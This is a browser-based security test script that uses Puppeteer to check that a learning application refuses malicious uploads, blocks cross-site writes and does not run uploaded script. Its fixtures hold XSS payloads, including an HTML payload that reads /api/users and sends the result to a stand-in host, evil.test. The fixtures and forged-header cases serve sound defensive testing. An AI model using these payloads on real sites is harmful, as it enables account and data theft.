/*
 * REAL-BROWSER verification for PR #40 (uploaded-file content policy and the
 * forwarded-header origin policy).
 *
 * The other probes in this directory are HTTP-level probes: they prove what
 * the SERVER sends. This one proves what a BROWSER does with it — which is
 * the only way to answer the questions that matter most:
 *
 *   - Does `Content-Security-Policy: sandbox` on a file response break the
 *     image / audio / video previews the application depends on?
 *   - Does `X-Content-Type-Options: nosniff` stop the browser from rendering
 *     HTML bytes that the server labelled `image/png`?
 *   - Does an uploaded HTML payload execute in the application's own origin?
 *   - Does the session cookie behave (HttpOnly, SameSite) in a real browser?
 *   - Do the real UI upload paths (the `FileUploader` component) accept the
 *     legitimate files and refuse the dangerous ones?
 *
 * It drives a real Chromium through Puppeteer against a PRODUCTION build on a
 * DISPOSABLE database. It never touches production data, secrets or settings.
 *
 * ── How to run it ────────────────────────────────────────────────────────────
 *
 *   1. A production build and a disposable PostgreSQL with the migration
 *      chain applied:
 *
 *        DATABASE_URL=postgres://test:test@127.0.0.1:5432/easylearn_rv40 \
 *        JWT_SECRET="$(openssl rand -base64 48)" \
 *        EASY_LEARN_TEST_DATABASE=true UPLOAD_DIR=/tmp/rv40-uploads \
 *        NODE_ENV=production npx next start -p 3400
 *
 *   2. Then, from the repository root:
 *
 *        DATABASE_URL=postgres://test:test@127.0.0.1:5432/easylearn_rv40 \
 *        UPLOAD_DIR=/tmp/rv40-uploads \
 *        PROBE_BASE=http://127.0.0.1:3400 \
 *        CHROMIUM_EXECUTABLE=/path/to/chrome \
 *        node tests/manual/browser-upload-verification.js
 *
 * `CHROMIUM_EXECUTABLE` must point at a Chromium/Chrome binary. `puppeteer-core`
 * must be installed (`npm i --no-save puppeteer-core`); no browser is
 * downloaded, so the script never needs a network connection.
 *
 * The script exits non-zero when any check fails.
 */
"use strict";

const fs = require("fs");
const http = require("http");
const path = require("path");
const os = require("os");
const { Client } = require("pg");
const bcrypt = require("bcryptjs");
const puppeteer = require("puppeteer-core");

const BASE = process.env.PROBE_BASE || "http://127.0.0.1:3400";
/** A different origin for the same server — used for the cross-origin test. */
const DATABASE_URL =
  process.env.DATABASE_URL || "postgres://test:test@127.0.0.1:5432/easylearn_rv40";
const UPLOAD_DIR = process.env.UPLOAD_DIR || "/tmp/rv40-uploads";
const CHROMIUM = process.env.CHROMIUM_EXECUTABLE || "";
/** The port the attacker page is served from (a different origin from the app). */
const ATTACKER_PORT = Number(process.env.PROBE_ATTACKER_PORT || 3498);

let passed = 0;
let failed = 0;
const failures = [];

function check(name, condition, detail) {
  if (condition) {
    console.log(`✅ PASS: ${name}`);
    passed++;
  } else {
    console.error(`❌ FAIL: ${name}${detail ? `\n   ${detail}` : ""}`);
    failures.push(name);
    failed++;
  }
}

/* ── Fixtures ─────────────────────────────────────────────────────────────── */

/** A real, decodable 1x1 PNG. */
const PNG_BYTES = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
  "base64"
);
const HTML_PAYLOAD = Buffer.from(
  `<!DOCTYPE html><html><body><script>window.__XSS_EXECUTED__=true;document.title='PWNED';fetch('/api/users').then(r=>r.text()).then(t=>fetch('https://evil.test/?'+encodeURIComponent(t)))</script></body></html>`
);
const SVG_PAYLOAD = Buffer.from(
  `<svg xmlns="http://www.w3.org/2000/svg"><script>window.__XSS_EXECUTED__=true</script></svg>`
);
const XHTML_PAYLOAD = Buffer.from(
  `<?xml version="1.0"?><!DOCTYPE html><html><body><script>window.__XSS_EXECUTED__=true</script></body></html>`
);
const ZIP_BYTES = Buffer.from([0x50, 0x4b, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00]);
const TXT_BYTES = Buffer.from("Just some notes for the assignment.\n");

const SCHOOL_ID = "11111111-1111-4111-8111-111111111111";
const SCHOOL_ID_2 = "33333333-3333-4333-8333-333333333333";
/** A teacher who belongs to ONE school — the ordinary case. */
const TEACHER_ID = "22222222-2222-4222-8222-222222222222";
/** A teacher who belongs to TWO schools — the school-selection case. */
const TEACHER_2_ID = "44444444-4444-4444-8444-444444444444";
const EMAIL = "teacher@browser.test";
const EMAIL_2 = "teacher2@browser.test";
const PASSWORD = "BrowserProbe123!";

/* ── Database ─────────────────────────────────────────────────────────────── */

async function seed() {
  const client = new Client({ connectionString: DATABASE_URL });
  await client.connect();
  const passwordHash = await bcrypt.hash(PASSWORD, 12);
  await client.query(
    `INSERT INTO schools (id, name, short_name, slug, status)
     VALUES ($1, 'Browser Probe School', 'BPS', 'browser-probe-school', 'active')
     ON CONFLICT (id) DO NOTHING`,
    [SCHOOL_ID]
  );
  await client.query(
    `INSERT INTO schools (id, name, short_name, slug, status)
     VALUES ($1, 'Second Probe School', 'SPS', 'second-probe-school', 'active')
     ON CONFLICT (id) DO NOTHING`,
    [SCHOOL_ID_2]
  );
  await client.query(
    `INSERT INTO users (id, email, password_hash, role, first_name, last_name, is_active, email_verified)
     VALUES ($1, $2, $3, 'teacher', 'Browser', 'Teacher', true, true)
     ON CONFLICT (id) DO NOTHING`,
    [TEACHER_ID, EMAIL, passwordHash]
  );
  await client.query(
    `INSERT INTO users (id, email, password_hash, role, first_name, last_name, is_active, email_verified)
     VALUES ($1, $2, $3, 'teacher', 'Two', 'Schools', true, true)
     ON CONFLICT (id) DO NOTHING`,
    [TEACHER_2_ID, EMAIL_2, passwordHash]
  );
  await client.query(
    `INSERT INTO school_users (school_id, user_id, role, status)
     VALUES ($1, $2, 'teacher', 'active')
     ON CONFLICT (school_id, user_id) DO NOTHING`,
    [SCHOOL_ID, TEACHER_ID]
  );
  /* The two-school teacher, so the login page exercises the school picker. */
  await client.query(
    `INSERT INTO school_users (school_id, user_id, role, status)
     VALUES ($1, $2, 'teacher', 'active')
     ON CONFLICT (school_id, user_id) DO NOTHING`,
    [SCHOOL_ID, TEACHER_2_ID]
  );
  await client.query(
    `INSERT INTO school_users (school_id, user_id, role, status)
     VALUES ($1, $2, 'teacher', 'active')
     ON CONFLICT (school_id, user_id) DO NOTHING`,
    [SCHOOL_ID_2, TEACHER_2_ID]
  );
  await client.end();
}

/**
 * Insert a row the way an OLD (pre-fix) upload would have left it: the
 * `mime_type` column holds the type the CLIENT declared, and the bytes on
 * disk are HTML.
 *
 * This is the case the review called out: refusing the filename is not
 * enough — the STORED and SERVED response has to be checked.
 */
async function insertLegacyHtmlRow(storedName, originalName, bytes, uploaderId = TEACHER_ID) {
  const client = new Client({ connectionString: DATABASE_URL });
  await client.connect();
  fs.mkdirSync(UPLOAD_DIR, { recursive: true });
  fs.writeFileSync(path.join(UPLOAD_DIR, storedName), bytes);
  /* Make the probe re-runnable: the stored name is unique. */
  await client.query(`DELETE FROM uploaded_files WHERE stored_name = $1`, [storedName]);
  const { rows } = await client.query(
    `INSERT INTO uploaded_files
       (school_id, uploader_id, purpose, original_name, stored_name, mime_type, category, size_bytes, storage_backend)
     VALUES ($1, $2, 'assignment', $3, $4, 'text/html', 'image', $5, 'local')
     RETURNING id`,
    [SCHOOL_ID, uploaderId, originalName, storedName, bytes.length]
  );
  await client.end();
  return rows[0].id;
}

/* ── Browser helpers ──────────────────────────────────────────────────────── */

const consoleMessages = [];
const pageErrors = [];

function recordConsole(message) {
  const type = message.type();
  const text = message.text();
  consoleMessages.push({ type, text });
  if (type === "error" || type === "warning") {
    console.log(`   [browser ${type}] ${text.slice(0, 160)}`);
  }
}

/** Waits until the predicate holds or the timeout expires. */
async function waitFor(page, fn, timeout = 20000, interval = 250) {
  const deadline = Date.now() + timeout;
  for (;;) {
    let value;
    try {
      value = await fn();
    } catch {
      value = false;
    }
    if (value) return value;
    if (Date.now() > deadline) return value;
    await new Promise((resolve) => setTimeout(resolve, interval));
  }
}

/**
 * The API call the browser makes, with the browser's own cookies and Origin.
 * Used for the CSRF checks so the request is exactly what a page would send.
 */
async function browserWrite(page, url, options = {}) {
  return page.evaluate(
    async (target, opts) => {
      const response = await fetch(target, {
        method: opts.method || "POST",
        headers: {
          "Content-Type": "application/json",
          ...(opts.headers || {}),
        },
        body: opts.body ? JSON.stringify(opts.body) : undefined,
        credentials: "same-origin",
      });
      let body = null;
      try {
        body = await response.json();
      } catch {
        body = null;
      }
      return { status: response.status, body };
    },
    url,
    options
  );
}

/** Logs in through the real login form and returns the page. */
async function loginThroughTheForm(browser, email) {
  const page = await browser.newPage();
  page.on("console", recordConsole);
  page.on("pageerror", (error) => {
    pageErrors.push(String(error));
    console.log(`   [pageerror] ${error}`);
  });
  page.on("requestfailed", (request) => {
    console.log(
      `   [requestfailed] ${request.method()} ${request.url()} — ${request.failure()?.errorText}`
    );
  });
  await page.goto(`${BASE}/login`, { waitUntil: "networkidle2", timeout: 45000 });
  await page.waitForSelector('input[type="text"]', { timeout: 20000 });
  const formReady = await page.evaluate(
    () => Boolean(document.querySelector('form button[type="submit"]')) && Boolean(document.querySelector('input[type="password"]'))
  );
  console.log(`   login form ready: ${formReady}`);
  await page.type('input[type="text"]', email);
  await page.type('input[type="password"]', PASSWORD);
  await Promise.all([
    page.waitForNavigation({ waitUntil: "networkidle2", timeout: 45000 }).catch(() => null),
    page.click('button[type="submit"]'),
  ]);
  /* The login page navigates with the client-side router, so there may be no
     full page load to wait for — wait for the URL instead. */
  await waitFor(page, async () => page.url().includes("/dashboard"), 30000);
  return page;
}

/* ── The checks ───────────────────────────────────────────────────────────── */

async function main() {
  console.log("🧭 Real-browser verification for PR #40\n");
  if (!CHROMIUM) {
    console.error("CHROMIUM_EXECUTABLE is not set — a real browser is required.");
    process.exit(2);
  }

  await seed();

  const browser = await puppeteer.launch({
    executablePath: CHROMIUM,
    headless: "shell",
    args: [
      "--no-sandbox",
      "--disable-setuid-sandbox",
      "--disable-dev-shm-usage",
      "--autoplay-policy=no-user-gesture-required",
    ],
  });

  try {
    /* ── 1. Login, session cookie, school selection ───────────────────────── */
    console.log("\n── 1. Login, session cookie and school selection ──");
    const page = await loginThroughTheForm(browser, EMAIL);
    check("the login page loads and the login form is submitted", true);

    const cookies = await page.cookies();
    const session = cookies.find((c) => c.name === "el_token");
    check("a session cookie was issued", Boolean(session), JSON.stringify(cookies.map((c) => c.name)));
    if (session) {
      check("the session cookie is HttpOnly", session.httpOnly === true, String(session.httpOnly));
      check(
        "the session cookie is SameSite=Lax or Strict",
        session.sameSite === "Lax" || session.sameSite === "Strict",
        String(session.sameSite)
      );
      check("the session cookie is scoped to the app path", session.path === "/", session.path);
    }
    const visibleCookie = await page.evaluate(() => document.cookie);
    check(
      "document.cookie does not expose the session token",
      !visibleCookie.includes("el_token"),
      visibleCookie
    );

    const afterLogin = page.url();
    check(
      "the login redirects into the dashboard",
      afterLogin.includes("/dashboard"),
      afterLogin
    );
    await page.goto(`${BASE}/dashboard/teacher/assignments`, {
      waitUntil: "networkidle2",
      timeout: 45000,
    });
    check(
      "the teacher assignments page loads",
      page.url().includes("/dashboard/teacher/assignments"),
      page.url()
    );

    /* The school picker: an account with two memberships must be asked. */
    const twoSchoolPage = await loginThroughTheForm(browser, EMAIL_2);
    const pickerShown = await waitFor(
      twoSchoolPage,
      async () =>
        twoSchoolPage.evaluate(() =>
          Array.from(document.querySelectorAll("button")).some((b) =>
            /Probe School/i.test(b.textContent || "")
          )
        ),
      15000
    );
    check("an account with two memberships is offered the school selection", Boolean(pickerShown));
    if (pickerShown) {
      const chosen = await waitFor(
        twoSchoolPage,
        async () => {
          await twoSchoolPage.evaluate(() => {
            const buttons = Array.from(document.querySelectorAll("button"));
            const target = buttons.find((b) => /Browser Probe School/i.test(b.textContent || ""));
            if (target) target.click();
          });
          return twoSchoolPage.url().includes("/dashboard");
        },
        30000
      );
      check("choosing a school opens the dashboard", Boolean(chosen), twoSchoolPage.url());
    }
    await twoSchoolPage.close();

    /* ── 2. CSRF-protected writes with the supported proxy configuration ───── */
    console.log("\n── 2. CSRF-protected writes ──");

    /* A forged forwarded HOST must not change where the request is sent. The
       default configuration does not trust the forwarded headers at all: the
       request is compared against the `Host` header and the browser's own
       origin, so a forged `X-Forwarded-Host` cannot move the request to
       another origin — it is simply ignored. */
    const forgedHost = await browserWrite(page, "/api/auth/select-school", {
      method: "POST",
      headers: { "X-Forwarded-Host": "evil.test" },
      body: { schoolId: SCHOOL_ID },
    });
    check(
      "a write with a forged forwarded host is still made against this application's own origin",
      forgedHost.status >= 200 && forgedHost.status < 400,
      `status ${forgedHost.status}: ${JSON.stringify(forgedHost.body)}`
    );

    /* A forged forwarded PROTO used to REFUSE a legitimate same-origin write.
       Next.js derives the request URL's scheme from that header, so the
       comparison was made against `https://<host>` while the browser was on
       `http://<host>`, and the write was refused. The browser's own
       `Sec-Fetch-Site: same-origin` is proof about the real origins, so the
       write is no longer refused. */
    const forgedProto = await browserWrite(page, "/api/auth/select-school", {
      method: "POST",
      headers: { "X-Forwarded-Proto": "https" },
      body: { schoolId: SCHOOL_ID },
    });
    check(
      "a write with a forged forwarded proto is no longer refused",
      forgedProto.status >= 200 && forgedProto.status < 400,
      `status ${forgedProto.status}: ${JSON.stringify(forgedProto.body)}`
    );

    /* Both headers together must not move the request to another origin
       either. */
    const forgedBoth = await browserWrite(page, "/api/auth/select-school", {
      method: "POST",
      headers: {
        "X-Forwarded-Host": "evil.test",
        "X-Forwarded-Proto": "https",
      },
      body: { schoolId: SCHOOL_ID },
    });
    check(
      "a write with both forged forwarded headers is still made against this application's own origin",
      forgedBoth.status >= 200 && forgedBoth.status < 400,
      `status ${forgedBoth.status}: ${JSON.stringify(forgedBoth.body)}`
    );

    /* The same write without the forged headers must work: the fix must not
       break ordinary same-origin writes. */
    const legitimate = await browserWrite(page, "/api/auth/select-school", {
      method: "POST",
      body: { schoolId: SCHOOL_ID },
    });
    check(
      "an ordinary same-origin write still succeeds",
      legitimate.status >= 200 && legitimate.status < 400,
      `status ${legitimate.status}: ${JSON.stringify(legitimate.body)}`
    );

    /* A write from a page on ANOTHER origin must not succeed.

       The attacker page is served from its OWN origin (a tiny local server),
       not from the application, so the application's own CSP does not block
       the request before it reaches the server — what is measured is the
       server's answer to a genuine cross-site request. */
    const attackerServer = http.createServer((request, response) => {
      response.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
      response.end("<!DOCTYPE html><html><body>attacker</body></html>");
    });
    await new Promise((resolve) => attackerServer.listen(ATTACKER_PORT, "127.0.0.1", resolve));
    const attackerOrigin = `http://127.0.0.1:${ATTACKER_PORT}`;
    const foreignPage = await browser.newPage();
    let foreignStatus = null;
    foreignPage.on("response", (response) => {
      if (response.url().includes("/api/auth/select-school")) {
        foreignStatus = response.status();
      }
    });
    await foreignPage.goto(`${attackerOrigin}/`, { waitUntil: "domcontentloaded", timeout: 45000 });
    await foreignPage
      .evaluate(
        async (target) => {
          try {
            await fetch(target, {
              method: "POST",
              mode: "no-cors",
              headers: { "Content-Type": "text/plain" },
              body: "{}",
              credentials: "include",
            });
          } catch {
            /* a network-level refusal is also a refusal */
          }
        },
        `${BASE}/api/auth/select-school`
      )
      .catch(() => null);
    await new Promise((resolve) => setTimeout(resolve, 2000));
    check(
      "a cross-site write from another origin is refused (not 2xx)",
      foreignStatus !== null && foreignStatus >= 400,
      `status ${foreignStatus}`
    );
    await foreignPage.close();
    await new Promise((resolve) => attackerServer.close(resolve));

    /* ── 3. The real upload UI ───────────────────────────────────────────── */
    console.log("\n── 3. Upload through the real UI ──");

    const workDir = fs.mkdtempSync(path.join(os.tmpdir(), "rv40-browser-"));
    const pngPath = path.join(workDir, "photo.png");
    const htmlPath = path.join(workDir, "evil.png"); // HTML bytes, .png name
    const svgPath = path.join(workDir, "evil.svg");
    const xhtmlPath = path.join(workDir, "evil.xhtml");
    const zipPath = path.join(workDir, "archive.png"); // ZIP bytes, .png name
    const txtPath = path.join(workDir, "notes.txt");
    fs.writeFileSync(pngPath, PNG_BYTES);
    fs.writeFileSync(htmlPath, HTML_PAYLOAD);
    fs.writeFileSync(svgPath, SVG_PAYLOAD);
    fs.writeFileSync(xhtmlPath, XHTML_PAYLOAD);
    fs.writeFileSync(zipPath, ZIP_BYTES);
    fs.writeFileSync(txtPath, TXT_BYTES);

    // Open the "new assignment" form so the FileUploader is mounted.
    await page.evaluate(() => {
      const buttons = Array.from(document.querySelectorAll("button"));
      const target = buttons.find((b) => /new assignment|create assignment/i.test(b.textContent || ""));
      if (target) target.click();
    });
    await page.waitForSelector('input[type="file"]', { timeout: 20000 });
    check("the assignment form exposes a file input", true);

    const mentions = (needle) =>
      page.evaluate(
        (text) =>
          Array.from(document.querySelectorAll("p,span,div,li")).some((element) =>
            (element.textContent || "").includes(text)
          ),
        needle
      );

    /* 3a. A legitimate PNG must upload. */
    let input = await page.$('input[type="file"]');
    await input.uploadFile(pngPath);
    const pngAttached = await waitFor(page, () => mentions("photo.png"), 25000);
    check("a legitimate PNG is accepted by the real UI", Boolean(pngAttached));
    /* Wait until the PNG's own entry is in the attachment list, so the
       "was it attached?" measurements below are not racing with it. */
    await waitFor(
      page,
      async () => (await page.evaluate(() => document.querySelectorAll('button[title="Remove file"]').length)) >= 1,
      20000
    );

    /* 3b. The dangerous files must be refused.

       The evidence is the NETWORK, not the DOM: the client refuses the files
       whose EXTENSION is not allowed (no request is made at all), and the
       SERVER must refuse the one whose extension looks fine but whose bytes
       are not. In both cases the file must not end up attached. */
    const uploadResponses = [];
    page.on("response", (response) => {
      if (response.url().includes("/api/uploads") && response.request().method() === "POST") {
        uploadResponses.push({ url: response.url(), status: response.status() });
      }
    });

    /* The attached files are the entries with a "Remove file" button; the
       failure notice is the banner that starts with the warning sign. */
    const uiState = () =>
      page.evaluate(() => {
        const removeButtons = Array.from(document.querySelectorAll('button[title="Remove file"]'));
        const names = removeButtons.map((button) => {
          const row = button.parentElement;
          const label = row ? row.querySelector("p") : null;
          return label ? (label.textContent || "").trim() : "";
        });
        return {
          attached: removeButtons.length,
          names,
          error:
            Array.from(document.querySelectorAll("div"))
              .map((element) => (element.textContent || "").trim())
              .filter((text) => text.startsWith("⚠️") && text.length < 400)
              .pop() || "",
        };
      });

    const attemptUpload = async (filePath, label) => {
      const before = uploadResponses.length;
      const beforeState = await uiState();
      const handle = await page.$('input[type="file"]');
      await handle.uploadFile(filePath);
      await new Promise((resolve) => setTimeout(resolve, 4000));
      const made = uploadResponses.slice(before);
      const afterState = await uiState();
      return {
        requests: made,
        added: afterState.attached - beforeState.attached,
        names: afterState.names,
        error: afterState.error,
      };
    };

    for (const [filePath, label, description] of [
      [htmlPath, "evil.png", "HTML bytes in a .png"],
      [svgPath, "evil.svg", "an .svg file"],
      [xhtmlPath, "evil.xhtml", "an .xhtml file"],
      [zipPath, "archive.png", "ZIP bytes in a .png"],
    ]) {
      const result = await attemptUpload(filePath, label);
      const serverRefused =
        result.requests.length === 0 ||
        result.requests.every((r) => r.status >= 400 && r.status < 500);
      check(
        `${description} is refused by the real UI`,
        serverRefused &&
          result.added === 0 &&
          result.error.length > 0 &&
          !result.names.includes(label),
        `requests: ${JSON.stringify(result.requests)} added: ${result.added} attached: ${JSON.stringify(result.names)} error: ${JSON.stringify(result.error.slice(0, 120))}`
      );
    }

    /* 3c. A legitimate text file must still work. */
    const txtHandle = await page.$('input[type="file"]');
    await txtHandle.uploadFile(txtPath);
    const txtAttached = await waitFor(page, () => mentions("notes.txt"), 20000);
    check("a legitimate .txt file is accepted by the real UI", Boolean(txtAttached));

    /* ── 4. The served response in a real browser ────────────────────────── */
    console.log("\n── 4. The served response in a real browser ──");

    const legacyPngId = await insertLegacyHtmlRow(
      "legacy-payload.png",
      "legacy-payload.png",
      HTML_PAYLOAD
    );
    const legacyHtmlId = await insertLegacyHtmlRow(
      "legacy-payload.html",
      "legacy-payload.html",
      HTML_PAYLOAD
    );

    const headersFor = async (id) => {
      const response = await page.evaluate(async (target) => {
        const result = await fetch(target, { credentials: "same-origin" });
        const headers = {};
        result.headers.forEach((value, key) => {
          headers[key] = value;
        });
        return { status: result.status, headers };
      }, `/api/files/${id}`);
      return response;
    };

    const legacyPngHeaders = await headersFor(legacyPngId);
    check(
      "the legacy row is served (not a 404)",
      legacyPngHeaders.status === 200,
      `status ${legacyPngHeaders.status}`
    );
    check(
      "a legacy row that declared text/html is NOT served as text/html",
      !/text\/html/i.test(legacyPngHeaders.headers["content-type"] || ""),
      legacyPngHeaders.headers["content-type"]
    );
    check(
      "the legacy row is served as image/png",
      /^image\/png/.test(legacyPngHeaders.headers["content-type"] || ""),
      legacyPngHeaders.headers["content-type"]
    );
    check(
      "the legacy row is served with nosniff",
      legacyPngHeaders.headers["x-content-type-options"] === "nosniff",
      legacyPngHeaders.headers["x-content-type-options"]
    );
    check(
      "the legacy row is served with a sandboxing policy",
      /sandbox/.test(legacyPngHeaders.headers["content-security-policy"] || ""),
      legacyPngHeaders.headers["content-security-policy"]
    );
    check(
      "the legacy row forbids cross-origin embedding",
      legacyPngHeaders.headers["cross-origin-resource-policy"] === "same-origin",
      legacyPngHeaders.headers["cross-origin-resource-policy"]
    );

    const legacyHtmlHeaders = await headersFor(legacyHtmlId);
    check(
      "a legacy .html row is served as a download, not a document",
      /application\/octet-stream/.test(legacyHtmlHeaders.headers["content-type"] || "") &&
        /^attachment/.test(legacyHtmlHeaders.headers["content-disposition"] || ""),
      `${legacyHtmlHeaders.headers["content-type"]} / ${legacyHtmlHeaders.headers["content-disposition"]}`
    );

    /* ── 5. Can uploaded content execute in the app's origin? ─────────────── */
    console.log("\n── 5. Script execution in the authenticated origin ──");

    for (const [label, id] of [
      ["the legacy row served as image/png", legacyPngId],
      ["the legacy row served as a .html download", legacyHtmlId],
    ]) {
      const probe = await browser.newPage();
      probe.on("pageerror", () => {});
      let navigation = "loaded";
      try {
        await probe.goto(`${BASE}/api/files/${id}`, {
          waitUntil: "networkidle2",
          timeout: 30000,
        });
      } catch (error) {
        /* A response served with `Content-Disposition: attachment` makes the
           browser start a DOWNLOAD and abort the navigation. That is the
           intended behaviour, not a failure. */
        navigation = /ERR_ABORTED/.test(String(error)) ? "downloaded" : String(error);
      }
      const executed = await probe.evaluate(() => window.__XSS_EXECUTED__ === true).catch(() => false);
      const contentType = await probe.evaluate(() => document.contentType).catch(() => "");
      check(
        `${label} does NOT execute script`,
        executed === false,
        `navigation: ${navigation}, contentType: ${contentType}`
      );
      await probe.close();
    }

    /* ── 6. Logout ────────────────────────────────────────────────────────── */
    console.log("\n── 6. Logout ──");
    const logoutResult = await browserWrite(page, "/api/auth/logout", { method: "POST" });
    check(
      "logout succeeds",
      logoutResult.status >= 200 && logoutResult.status < 400,
      `status ${logoutResult.status}: ${JSON.stringify(logoutResult.body)}`
    );
    const cookiesAfterLogout = await page.cookies();
    const sessionAfter = cookiesAfterLogout.find((c) => c.name === "el_token");
    check(
      "the session cookie is cleared on logout",
      !sessionAfter || sessionAfter.value === "",
      sessionAfter ? sessionAfter.value : "absent"
    );
    const afterLogout = await page.evaluate(async () => {
      const response = await fetch("/api/auth/me", { credentials: "same-origin" });
      return response.status;
    });
    check(
      "the API refuses the request after logout",
      afterLogout === 401 || afterLogout === 403,
      `status ${afterLogout}`
    );

    /* ── 7. Console hygiene ───────────────────────────────────────────────── */
    console.log("\n── 7. Browser console ──");
    const cspViolations = consoleMessages.filter((m) =>
      /Content Security Policy|Refused to/i.test(m.text)
    );
    check(
      "no Content-Security-Policy violation was reported in the console",
      cspViolations.length === 0,
      JSON.stringify(cspViolations.slice(0, 5))
    );
    const pageErrorsSeen = pageErrors.filter((e) => !/XSS_EXECUTED/.test(e));
    check(
      "no uncaught page error was raised",
      pageErrorsSeen.length === 0,
      JSON.stringify(pageErrorsSeen.slice(0, 5))
    );

    console.log(`\n📊 Results: ${passed} passed, ${failed} failed`);
    if (failed > 0) {
      console.error(`\n❌ Failed checks:\n - ${failures.join("\n - ")}`);
      process.exitCode = 1;
    } else {
      console.log(`✅ ${passed} real-browser checks passed`);
    }
  } finally {
    await browser.close().catch(() => {});
  }
}

main().catch((error) => {
  console.error("Browser verification failed to run:", error);
  process.exitCode = 1;
});
